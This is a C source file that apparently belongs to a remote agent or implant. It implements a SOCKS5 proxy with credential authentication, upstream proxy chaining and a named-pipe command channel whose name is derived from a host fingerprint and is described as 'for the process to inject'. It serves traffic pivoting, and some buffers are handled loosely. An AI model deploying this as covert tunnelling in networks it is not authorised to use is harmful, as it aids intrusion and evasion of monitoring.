#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "agent_named_pipe.h"
#include "agent_process.h"
#include "agent_thread.h"
#include "agent_utility.h"
#include "agent_commands.h"
#include "agent_socks5.h"

#ifdef  _WIN32
// Winsock2 definition needs to be placed in a specific location, see: https://www.zachburlingame.com/2011/05/resolving-redefinition-errors-betwen-ws2def-h-and-winsock-h/
#include <WinSock2.h>
#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#define ISVALIDSOCKET(s) ((s) != INVALID_SOCKET)
#define CLOSESOCKET(s) do { if (s) closesocket(s); } while (false)
#define GETSOCKETERRNO() (WSAGetLastError())
#else
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>
#define SOCKET int
#define ISVALIDSOCKET(s) ((s) >= 0)
#define CLOSESOCKET(s) (close(s))
#define GETSOCKETERRNO() (errno)
#endif

static void generate_named_pipe(char* port, char pipe_name[64])
{
	// create the named pipe for the process to inject
	uint32_t seed = system_fingerprint() * 8;
	int i = 0;	
	for (i = 0; i < strlen(port); i++) {
		seed ^= port[i] << ((8 * i) % 32);
	}

	strcat(pipe_name, "//./pipe/");
	gen_random_string(seed, 32, &pipe_name[strlen(pipe_name)]);
}

static void proxy_context_free(socks5_context* proxy_context)
{
	if (proxy_context) {
		FREE(proxy_context->username);
		FREE(proxy_context->password);
		FREE(proxy_context->address);
		FREE(proxy_context->port);

		proxy_context->username = ZERO(char);
		proxy_context->password = ZERO(char);
		proxy_context->address = ZERO(char);
		proxy_context->port = ZERO(char);

		if (proxy_context->proxy) {
			proxy_context_free(proxy_context->proxy);
			FREE(proxy_context->proxy);
		}
	}
}

static char* create_proxy_info(socks5_context* context)
{
	char* str_proxy_info = ZERO(char);

	cJSON* proxy_info = cJSON_CreateObject();
	if (!proxy_info) goto fail;

	// create JSON object
	cJSON* jaddress = cJSON_CreateString(context->address);
	if (!jaddress) goto fail;
	if (!cJSON_AddItemToObject(proxy_info, "address", jaddress)) goto fail;

	cJSON* jport = cJSON_CreateString(context->port);
	if (!jport) goto fail;
	if (!cJSON_AddItemToObject(proxy_info, "port", jport)) goto fail;

	cJSON* jusername = cJSON_CreateString(context->username);
	if (!jusername) goto fail;
	if (!cJSON_AddItemToObject(proxy_info, "username", jusername)) goto fail;

	cJSON* jpassword = cJSON_CreateString(context->password);
	if (!jpassword) goto fail;
	if (!cJSON_AddItemToObject(proxy_info, "password", jpassword)) goto fail;

	cJSON* jtransmitted = cJSON_CreateNumber(context->transmitted_bytes);
	if (!jtransmitted) goto fail;
	if (!cJSON_AddItemToObject(proxy_info, "transmitted", jtransmitted)) goto fail;

	cJSON* jreceived = cJSON_CreateNumber(context->received_bytes);
	if (!jreceived) goto fail;
	if (!cJSON_AddItemToObject(proxy_info, "received", jreceived)) goto fail;

	// create string result		
	str_proxy_info = cJSON_Print(proxy_info);
	if (!str_proxy_info) goto fail;

exit:
	if (proxy_info) cJSON_Delete(proxy_info);
	return str_proxy_info;

fail:	
	FREE(str_proxy_info);
	goto exit;
}

static bool parse_commands(void* data) 
{
	bool result = true;
	char* p = ZERO(char);	
	char* resp = ZERO(char);
	pipe_handle* pipe = ZERO(pipe_handle);
	socks5_context* context = (socks5_context*)data;

	char pipe_name[64] = { 0 };
	generate_named_pipe(context->port, pipe_name);

	// create the named pipe
	pipe = pipe_server_new(pipe_name, 0x4000, false, true);
	if (!pipe) goto fail;
	
	bool terminate = false;
	while (!terminate) {
		if (pipe_server_connect(pipe, -1)) {			
			resp = ZERO(char);
			
			// read command
			socks5_command* cmd = OBJ_ALLOC(socks5_command);
			if (!cmd) goto fail;
			pipe_read(pipe, sizeof(socks5_command), cmd);			
			cmd = realloc(cmd, FIELD_OFFSET(socks5_command, data[cmd->data_size]));
			if (!cmd) goto fail;
			pipe_read(pipe, cmd->data_size, &cmd->data);
			
			// execute command
			switch (cmd->type) {
			case STOP:
				terminate = true;
				context->use_proxy = false;
				break;
			case CHAIN_STOP:
				context->use_proxy = false;
				break;
			case INFO:
				resp = create_proxy_info(context);
				break;
			case CHAIN_CREATE:
				p = (char*)cmd->data;

				// create a new context ofr the proxy to use				
				// if a previous chain was defined this cause a small leak. 
				// This is ok since it is unlikely that a lot of chains are created. If
				// it apperas to be a problem, create a garbage bin that needs to be clared
				// from time-to-time
				context->proxy = OBJ_ALLOC(socks5_context);
				context->proxy->address = _strdup(p);
				context->proxy->address_len = strlen(context->proxy->address);
				p += strlen(p) + 1;
				context->proxy->port = _strdup(p);
				p += strlen(p) + 1;
				context->proxy->username = _strdup(p);
				context->proxy->username_len = strlen(context->proxy->username);
				p += strlen(p) + 1;
				context->proxy->password = _strdup(p);
				context->proxy->password_len = strlen(context->proxy->password);
				context->use_proxy = true;
				break;
			}
			
			if (resp) {
				uint32_t resp_size = strlen(resp) + 1;
				pipe_write(pipe, resp_size, resp);
				FREE(resp);
			}			

			pipe_server_disconnect(pipe);
			FREE(cmd);				
		}				
	}
		
exit:
	context->terminate = true;
	pipe_free(pipe);
	return result;

fail:
	result = false;
	goto exit;
}

bool proxy_send_command(socks5_command* cmd, char* port)
{
	pipe_handle* pipe = ZERO(pipe_handle);
	uint8_t* resp = MEM_ALLOC(4096);
	bool result = true;

	char pipe_name[64] = { 0 };
	generate_named_pipe(port, pipe_name);

	uint32_t cmd_size = sizeof(socks5_command) + cmd->data_size;	
	int32_t nread = pipe_client_call_pipe(pipe_name, 0x4000, cmd_size, (uint8_t*)cmd, 4095, resp);
	cmd->response = resp;
	cmd->response_size = nread;
exit:
	pipe_free(pipe);
	return result;
fail:
	result = false;
	goto exit;
}

static int nrecv(SOCKET fd, uint8_t* buf, int n) 
{
	int nread, left = n;
	FD_SET sockets = { 0 };
	FD_ZERO(&sockets);
	FD_SET(fd, &sockets);
	SOCKET max_socket = fd;

	struct timeval timeout = { 
		.tv_sec = 2,
		.tv_usec = 0
	};

	while (left > 0) {
		FD_SET reads = { 0 };
		reads = sockets;

		if (select(max_socket + 1, &reads, 0, 0, &timeout) < 0) {
			goto fail;
		}

		if (FD_ISSET(fd, &reads) && (nread = recv(fd, (char*)buf, left, 0)) == -1) {
			if (errno == EINTR || errno == EAGAIN)
				continue;
			else
				return 0;
		}
		else {
			if (nread == 0) {
				return 0;
			}
			else {
				left -= nread;
				buf += nread;
			}
		}
	}

exit:
	return n;

fail:
	n = 0;
	goto exit;
}

static bool socks5_auth_username_password(SOCKET client, socks5_context* context)
{
	bool result = true;
	char* username = ZERO(char);
	char* password = ZERO(char);

	// check if a configuration was specified, if not return error
	if (!context->username || !context->password) goto fail;

	// tell client which method to use
	socks_negotiation_response neg_resp = { 0 };
	neg_resp.ver = SOCKS5_VERSION;
	neg_resp.method = SOCKS5_METHOD_USERNAME_PASSWORD;
	send(client, (const char*)&neg_resp, sizeof(neg_resp), 0);
	
	// read username
	socks_auth_request_username auth_username = { 0 };
	if (!nrecv(client, (uint8_t*)&auth_username, sizeof(auth_username))) goto fail;
	if (auth_username.ver != SOCKS5_AUTH_SUBNEGOTIATION) goto fail;
	if (auth_username.ulen != context->username_len) goto fail;
	username = MEM_ALLOC(auth_username.ulen);
	if (!username) goto fail;	
	if (!nrecv(client, (uint8_t*)username, auth_username.ulen)) goto fail;

	// read password
	socks_auth_request_password auth_password = { 0 };
	if (!nrecv(client, (uint8_t*)&auth_password, sizeof(auth_password))) goto fail;
	if (auth_password.plen != context->password_len) goto fail;
	password = MEM_ALLOC(auth_password.plen);
	if (!password) goto fail;
	if (!nrecv(client, (uint8_t*)password, auth_password.plen)) goto fail;

	// do authentication
	result =
		!memcmp(username, context->username, context->username_len) &&
		!memcmp(password, context->password, context->password_len);

	// send auth response
	socks_auth_request_password_result auth_result = { 0 };
	auth_result.ver = SOCKS5_VERSION;
	auth_result.status = result ? SOCKS5_REPLYSTATUS_OK : SOCKS5_REPLYSTATUS_GENERAL_ERROR;
	send(client, (const char*)&auth_result, sizeof(auth_result), 0);

exit:
	FREE(username);
	FREE(password);
	return result;
fail:
	result = false;
	goto exit;
}

static bool socks5_auth_no_authentication(SOCKET client) 
{
	socks_negotiation_response neg_resp = { 0 };
	neg_resp.ver = SOCKS5_VERSION;
	neg_resp.method = SOCKS5_METHOD_NOAUTH;	
	send(client, (const char*)&neg_resp, sizeof(neg_resp), 0);
	return true;
}

static bool handle_client_negotiation(SOCKET client, socks5_context* context)
{
	bool result = true;
	socks_negotiation_request neg_req = { 0 };
	if (!nrecv(client, (uint8_t*)&neg_req, sizeof(neg_req))) goto fail;

	if (neg_req.ver == SOCKS4_VERSION) {
		// TODO implement socks4
		goto fail;
	}
	else if (neg_req.ver == SOCKS5_VERSION) {
		// read supported methods
		uint8_t nmethods[512] = { 0 };
		if (!nrecv(client, (uint8_t*)&nmethods, neg_req.n_methods)) goto fail;

		bool negotiation_result = false;
		int i = 0;
		for (i = 0; i < neg_req.n_methods; i++) {
			switch (nmethods[i]) {
			case SOCKS5_METHOD_NOAUTH:
				if (!context->username_len && !context->password_len)
					negotiation_result = socks5_auth_no_authentication(client);	
				break;
			case SOCKS5_METHOD_USERNAME_PASSWORD:
				negotiation_result = socks5_auth_username_password(client, context);
				break;
			default:
				break;
			}

			if (negotiation_result) break;
		}

		if (!negotiation_result) goto fail;
	}
	else {
		// invalid data
		goto fail;
	}

exit:
	return result;
fail:
	result = false;
	goto exit;
}

static uint8_t open_proxy_chain_session(socks5_context* context, char* address, char* port, SOCKET* server)
{
	uint8_t result = SOCKS5_REPLYSTATUS_GENERAL_ERROR;
	struct addrinfo* dest_address = ZERO(struct addrinfo);
	struct addrinfo hints = { 0 };
	
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE;
	if (getaddrinfo(context->proxy->address, context->proxy->port, &hints, &dest_address)) goto fail;

	// connect to proxy server
	*server = socket(dest_address->ai_family, dest_address->ai_socktype, dest_address->ai_protocol);
	if (!ISVALIDSOCKET(*server)) {
		result = SOCKS5_REPLYSTATUS_GENERAL_ERROR;
		goto fail;
	}
	else if (connect(*server, dest_address->ai_addr, dest_address->ai_addrlen)) {
		result = SOCKS5_REPLYSTATUS_HOST_UNREACHABLE;
		goto fail;
	}

	// negotiation request
	uint8_t neg_req[] = { SOCKS5_VERSION, 1, SOCKS5_METHOD_USERNAME_PASSWORD };
	send(*server, (char*)neg_req, sizeof(neg_req), 0);
	socks_negotiation_response neg_resp = { 0 };
	if (!nrecv(*server, (unsigned char*)&neg_resp, sizeof(neg_resp))) goto fail;
	if (neg_resp.method != SOCKS5_METHOD_USERNAME_PASSWORD || neg_resp.ver != SOCKS5_VERSION) goto fail;

	// send username
	socks_auth_request_username auth_username = { SOCKS5_AUTH_SUBNEGOTIATION, (uint8_t)context->proxy->username_len };
	send(*server, (char*)&auth_username, sizeof(auth_username), 0);
	send(*server, context->proxy->username, auth_username.ulen, 0);

	// send password
	socks_auth_request_password auth_password = { (uint8_t)context->proxy->password_len };
	send(*server, (char*)&auth_password, sizeof(auth_password), 0);
	send(*server, context->proxy->password, auth_password.plen, 0);

	// get auth result
	socks_auth_request_password_result auth_result = { 0 };
	if (!nrecv(*server, (unsigned char*)&auth_result, sizeof(auth_result))) goto fail;
	if (auth_result.ver != SOCKS5_VERSION || auth_result.status != SOCKS5_REPLYSTATUS_OK) goto fail;

	// enstablish session
	socks_request_details config = {
		.ver = SOCKS5_VERSION,
		.cmd = SOCKS5_COMMAND_CONNECT,
		.rsv = 0,
		.atyp = SOCKS5_TYPE_DOMAIN_NAME
	};
	send(*server, (char*)&config, sizeof(config), 0);

	// send address
	uint8_t address_size = strlen(address);
	send(*server, (char*)&address_size, sizeof(uint8_t), 0);
	send(*server, address, address_size, 0);

	// send port
	uint16_t iport = htons(atoi(port));
	send(*server, (char*)&iport, sizeof(uint16_t), 0);

	// read the proxy result
	socks_response_details resp = { 0 };
	uint8_t bind_address[1024] = { 0 };
	int n = 0;
	if (!nrecv(*server, (unsigned char*)&resp, sizeof(resp))) goto fail;
	if (!nrecv(*server, (unsigned char*)&n, sizeof(uint8_t))) goto fail;
	if (!nrecv(*server, (unsigned char*)bind_address, n)) goto fail;
	if (!nrecv(*server, (unsigned char*)&iport, sizeof(iport))) goto fail;
	result = resp.rep;

exit:
	freeaddrinfo(dest_address);
	return result;

fail:
	*server = 0;
	goto exit;
}

static bool handle_client_configuration(SOCKET client, proxy_session* session, socks5_context* context)
{
	bool result = true;
	SOCKET server = 0;
	uint8_t* address = ZERO(uint8_t);
	uint8_t* resp_buffer = ZERO(uint8_t);
	struct addrinfo* dest_address = ZERO(struct addrinfo);
	
	socks_request_details config = { 0 };
	if (!nrecv(client, (uint8_t*)&config, sizeof(config))) goto fail;

	// validity checks
	if (config.ver != SOCKS5_VERSION) goto fail;
	if (config.cmd != SOCKS5_COMMAND_CONNECT) goto fail;
	if (config.rsv != 0) goto fail;
	if (config.atyp != SOCKS5_TYPE_DOMAIN_NAME && config.atyp != SOCKS5_TYPE_IPV4_ADDRESS) goto fail;

	// read address
	struct addrinfo hints = { 0 };
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE;

	uint16_t port = 0;
	char port_str[16] = { 0 };
	char address_str[INET_ADDRSTRLEN] = { 0 };
	char* proxy_address = ZERO(char);
	size_t addr_size = 0;		

	switch (config.atyp) {
	case SOCKS5_TYPE_IPV4_ADDRESS:
		addr_size = 4;
		address = MEM_ALLOC(addr_size);
		if (!address) goto fail;

		if (!nrecv(client, address, 4)) goto fail;
		if (!nrecv(client, (uint8_t*)&port, sizeof(port))) goto fail;
		port = htons(port);

		inet_ntop(AF_INET, address, address_str, INET_ADDRSTRLEN);
		snprintf(port_str, sizeof(port_str) - 1, "%d", port);
		if (getaddrinfo(address_str, port_str, &hints, &dest_address)) goto fail;
		proxy_address = address_str;
		break;

	case SOCKS5_TYPE_DOMAIN_NAME:
		if (!nrecv(client, (uint8_t*)&addr_size, 1)) goto fail;
		address = MEM_ALLOC(addr_size);
		if (!address) goto fail;

		if (!nrecv(client, address, addr_size)) goto fail;
		if (!nrecv(client, (uint8_t*)&port, sizeof(port))) goto fail;		
		port = htons(port);

		snprintf(port_str, sizeof(port_str) - 1, "%d", port);
		if (getaddrinfo((char*)address, port_str, &hints, &dest_address)) goto fail;
		proxy_address = address;
		break;	

	default:
		goto fail;
	}	

	// connect to the destination
	size_t resp_size = sizeof(socks_response_details) + sizeof(uint16_t);

	switch (config.cmd) {
	case SOCKS5_COMMAND_CONNECT:
		// TODO implement IPv6 version
		if (config.atyp == SOCKS5_TYPE_IPV4_ADDRESS)
			resp_size += 4;
		else if (config.atyp == SOCKS5_TYPE_DOMAIN_NAME)
			resp_size += 1 + addr_size;
			
		resp_buffer = MEM_ALLOC(resp_size);
		if (!resp_buffer) goto fail;

		socks_response_details* resp = (socks_response_details*)resp_buffer;
		resp->rep = SOCKS5_REPLYSTATUS_OK;
		resp->ver = config.ver;
		resp->atyp = config.atyp;
		
		// connect to the server
		if (context->use_proxy) {
			resp->rep = open_proxy_chain_session(context, proxy_address, port_str, &server);
		}
		else {
			server = socket(dest_address->ai_family, dest_address->ai_socktype, dest_address->ai_protocol);
			if (!ISVALIDSOCKET(server)) {
				resp->rep = SOCKS5_REPLYSTATUS_GENERAL_ERROR;
			}
			else if (connect(server, dest_address->ai_addr, dest_address->ai_addrlen)) {
				resp->rep = SOCKS5_REPLYSTATUS_HOST_UNREACHABLE;
			}
		}

		result = resp->rep == SOCKS5_REPLYSTATUS_OK;

		// send response to the client
		port = htons(port);
		if (config.atyp == SOCKS5_TYPE_IPV4_ADDRESS) {
			memcpy(resp->bind_addr, address, addr_size);
			memcpy(resp->bind_addr + addr_size, (uint8_t*)&port, 2);
		}			
		else {
			memcpy(resp->bind_addr, &addr_size, 1);
			memcpy(resp->bind_addr + 1, address, addr_size);
			memcpy(resp->bind_addr + 1 + addr_size, (uint8_t*)&port, 2);
		}				
		
		send(client, (char*)resp_buffer, resp_size, 0);
		break;

	default:
		goto fail;
	}

	// everything is fine, update the session
	session->server = server;	

exit:
	FREE(address);
	FREE(resp_buffer);
	freeaddrinfo(dest_address);
	return result;
fail:
	result = false;
	goto exit;
}

static bool forward_data_to_server(socks5_context* context, SOCKET src, SOCKET dest)
{
	uint8_t buffer[1024] = { 0 };
	int received_bytes = recv(src, (char*)buffer, sizeof(buffer), 0);
	int bytes_sent = send(dest, (char*)buffer, received_bytes, 0);
	context->transmitted_bytes += bytes_sent;
	return received_bytes > 0 && received_bytes == bytes_sent;
}

static bool forward_data_to_client(socks5_context* context, SOCKET src, SOCKET dest)
{
	uint8_t buffer[1024] = { 0 };
	int received_bytes = recv(src, (char*)buffer, sizeof(buffer), 0);
	int bytes_sent = send(dest, (char*)buffer, received_bytes, 0);
	context->received_bytes += received_bytes;
	return received_bytes > 0 && received_bytes == bytes_sent;
}

static void remove_session(proxy_session** session, FD_SET* sockets, SOCKET i)
{
	proxy_session* prev = ZERO(proxy_session);
	proxy_session* session_p = *session;
	while (session_p) {
		if (session_p->client == i || session_p->server == i) {
			if (prev) {
				prev->next = session_p->next;
			}
			else {
				*session = session_p->next;
			}

			FD_CLR(session_p->client, sockets);
			CLOSESOCKET(session_p->client);

			FD_CLR(session_p->server, sockets);
			CLOSESOCKET(session_p->server);

			FREE(session_p);
			break;
		}
		prev = session_p;
		session_p = session_p->next;
	}
}

static int socks5_run(char* ip, char* port, socks5_context* context)
{
	int result = 0;
	if (!network_initialize()) {
		result = -1;
		goto exit;
	}
		
	SOCKET max_socket = 0;
	SOCKET proxy_socket = 0;	
	struct addrinfo *proxy = ZERO(struct addrinfo);
	proxy_session* session = ZERO(proxy_session);
	proxy_session* session_p = ZERO(proxy_session);

	// setup proxy socket
	struct addrinfo hints = { 0 };
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE;
	if (getaddrinfo(ip, port, &hints, &proxy)) {
		result = -1;
		goto exit;
	}
	proxy_socket = socket(proxy->ai_family, proxy->ai_socktype, proxy->ai_protocol);
	if (!ISVALIDSOCKET(proxy_socket)) {
		result = -2;
		goto exit;
	}

	if (bind(proxy_socket, proxy->ai_addr, proxy->ai_addrlen)) {
		result = -3;
		goto exit;
	}
	freeaddrinfo(proxy);

	if (listen(proxy_socket, 10)) {
		result = -4;
		goto exit;
	}

	// handle connections
	SOCKET i;
	FD_SET sockets = { 0 };
	FD_ZERO(&sockets);
	FD_SET(proxy_socket, &sockets);
	max_socket = proxy_socket;	

	struct timeval timeout = {
		.tv_sec = 2,
		.tv_usec = 0
	};
		
	while (!context->terminate) {
		FD_SET reads = { 0 };
		reads = sockets;
		if (select(max_socket + 1, &reads, 0, 0, &timeout) < 0) {
			result = -5;
			goto exit;
		}

		// check which socket is ready		
		for (i = 1; i <= max_socket; ++i) {
			if (FD_ISSET(i, &reads)) {
				if (i == proxy_socket) {
					// new client connected
					struct sockaddr_storage client_address;
					socklen_t client_len = sizeof(client_address);
					SOCKET socket_client = accept(proxy_socket, (struct sockaddr*)&client_address, &client_len);
					if (!ISVALIDSOCKET(socket_client)) {
						result = -6;
						goto exit;
					}

					FD_SET(socket_client, &sockets);
					if (socket_client > max_socket)
						max_socket = socket_client;

					// check the authentication if needed
					if (!handle_client_negotiation(socket_client, context)) {
						FD_CLR(socket_client, &sockets);
						CLOSESOCKET(socket_client);
						continue;
					}					

					// configure new session
					if (session) {
						session_p = OBJ_ALLOC(proxy_session);
						if (!session_p) {
							result = -7;
							goto exit;
						}

						// add the session
						proxy_session* s = session;
						while (s->next != 0) s = s->next;
						s->next = session_p;
					}
					else {
						session = OBJ_ALLOC(proxy_session);
						session_p = session;
						if (!session_p) {
							result = -8;
							goto exit;
						}
					}
					
					session_p->client = socket_client;

					// configure connection and contact the server
					if (!handle_client_configuration(socket_client, session_p, context)) {
						FD_CLR(socket_client, &sockets);
						CLOSESOCKET(socket_client);
						continue;
					}

					// all fine, add server socket to the list
					FD_SET(session_p->server, &sockets);
					if (session_p->server > max_socket)
						max_socket = session_p->server;
				}
				else {
					// forward data
					session_p = session;
					while (session_p) {
						if (session_p->client == i) {
							if (!forward_data_to_server(context, session_p->client, session_p->server))
								remove_session(&session, &sockets, i);
							break;
						}
						else if (session_p->server == i) {
							if (!forward_data_to_client(context, session_p->server, session_p->client))
								remove_session(&session, &sockets, i);
							int err = GETSOCKETERRNO();
							break;
						}
						session_p = session_p->next;
					}
				}
			}
		}
	}	

exit:	
	for (i = 1; i <= max_socket; ++i) {
		remove_session(&session, &sockets, i);
	}

	while (session) {
		session_p = session->next;
		FREE(session);
		session = session_p;
	}

	CLOSESOCKET(proxy_socket);
	network_close();
	return result;
}

int proxy_server_start(char* ip, char* port, char* username, char* password)
{
	int result = 0;
	thread_handle* thread = ZERO(thread_handle);
	socks5_context context = { 0 };
	context.address_len = strlen(ip);
	context.address = _strdup(ip);
	context.port_len = strlen(port);
	context.port = _strdup(port);

	if (username) {
		context.username = _strdup(username);
		context.username_len = strlen(username);
	}
	
	if (password) {
		context.password = _strdup(password);
		context.password_len = strlen(password);
	}
	
	// create thread to accept server config	
	thread = thread_start((thread_proc)parse_commands, &context);
	if (!thread) {
		result = -1;
		goto exit;
	}

	// run the socks5 server
	result = socks5_run(ip, port, &context);
	thread_wait(thread, 0x4000);

exit:
	proxy_context_free(&context);
	return result;
}

bool proxy_client_connect(mbedtls_net_context* server_fd, char* ip, char* port, char* username, char* password)
{
	bool result = true;
	int n = 0;
	if (mbedtls_net_connect(server_fd, ip, port, MBEDTLS_NET_PROTO_TCP)) goto fail;
	
	// negotiation request
	uint8_t neg_req[] = { SOCKS5_VERSION, 1, SOCKS5_METHOD_USERNAME_PASSWORD };
	mbedtls_net_send(server_fd, neg_req, sizeof(neg_req));
	socks_negotiation_response neg_resp = { 0 };
	if (mbedtls_net_recv(server_fd, (unsigned char*)&neg_resp, sizeof(neg_resp)) <= 0) goto fail;
	if (neg_resp.method != SOCKS5_METHOD_USERNAME_PASSWORD || neg_resp.ver != SOCKS5_VERSION) goto fail;

	// send username
	socks_auth_request_username auth_username = { SOCKS5_AUTH_SUBNEGOTIATION, strlen(username) };
	mbedtls_net_send(server_fd, (unsigned char*)&auth_username, sizeof(auth_username));
	mbedtls_net_send(server_fd, (unsigned char*)username, auth_username.ulen);

	// send password
	socks_auth_request_password auth_password = { strlen(password) };
	mbedtls_net_send(server_fd, (unsigned char*)&auth_password, sizeof(auth_password));
	mbedtls_net_send(server_fd, (unsigned char*)password, auth_password.plen);

	// get auth result
	socks_auth_request_password_result auth_result = { 0 };
	if (mbedtls_net_recv(server_fd, (unsigned char*)&auth_result, sizeof(auth_result)) <= 0) goto fail;
	if (auth_result.ver != SOCKS5_VERSION || auth_result.status != SOCKS5_REPLYSTATUS_OK) goto fail;

exit:
	return result;
fail:
	result = false;
	goto exit;
}

bool proxy_client_open(mbedtls_net_context* server_fd, char* ip, char* port)
{
	int n = 0;
	bool result = true;

	// enstablish session
	socks_request_details config = {
		.ver = SOCKS5_VERSION,
		.cmd = SOCKS5_COMMAND_CONNECT,
		.rsv = 0,
		.atyp = SOCKS5_TYPE_DOMAIN_NAME
	};
	mbedtls_net_send(server_fd, (unsigned char*)&config, sizeof(config));

	// send IP
	uint8_t ip_size = strlen(ip);
	mbedtls_net_send(server_fd, (unsigned char*)&ip_size, sizeof(uint8_t));
	mbedtls_net_send(server_fd, (unsigned char*)ip, ip_size);

	// send port
	uint16_t iport = htons(atoi(port));
	mbedtls_net_send(server_fd, (unsigned char*)&iport, sizeof(uint16_t));

	// read the proxy result
	socks_response_details resp = { 0 };
	uint8_t bind_address[1024] = { 0 };
	if (mbedtls_net_recv(server_fd, (unsigned char*)&resp, sizeof(resp)) <= 0) goto fail;
	if (mbedtls_net_recv(server_fd, (unsigned char*)&n, sizeof(uint8_t)) <= 0) goto fail;
	if (mbedtls_net_recv(server_fd, (unsigned char*)bind_address, n) <= 0) goto fail;
	if (mbedtls_net_recv(server_fd, (unsigned char*)&iport, sizeof(iport)) <= 0) goto fail;

	// check result
	if (resp.rep != SOCKS5_REPLYSTATUS_OK) goto fail;

exit:
	return result;
fail:
	result = false;
	goto exit;
}